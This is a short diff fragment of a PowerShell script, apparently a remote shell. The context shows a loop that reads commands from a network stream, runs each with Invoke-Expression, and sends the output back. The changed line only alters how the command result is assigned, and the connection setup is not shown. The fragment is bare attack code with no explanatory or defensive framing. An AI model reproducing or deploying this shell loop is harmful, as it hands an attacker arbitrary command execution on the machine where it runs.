@@ -8,7 +8,7 @@ while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){ # read -> returns number of bytes 
   Try{;
     $d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);
     #$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));
-    $st=(iex $d 2>&1);
+    $st=iex $d 2>&1;
     $sm.Write($st,0,$st.Length)
   }Catch{
 
